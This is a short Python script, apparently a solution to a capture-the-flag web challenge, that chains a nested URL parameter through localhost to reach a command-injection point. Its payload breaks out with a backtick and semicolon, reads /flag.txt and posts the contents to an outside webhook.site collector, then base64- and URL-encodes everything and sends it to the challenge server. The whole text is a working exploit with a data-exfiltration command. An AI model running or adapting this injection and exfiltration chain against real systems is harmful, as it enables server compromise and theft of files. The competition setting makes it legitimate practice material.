import base64
import requests
import urllib.parse

payload = "`;\ncat /flag.txt | curl https://webhook.site/ -X POST -d @-\n"
payload = base64.b64encode(payload.encode()).decode()
safe_string = urllib.parse.quote_plus("http://localhost/"+payload)
safe_string = urllib.parse.quote_plus("http://localhost/?url="+safe_string)
requests.get("http://challs.tfcctf.com:30795/?url="+safe_string)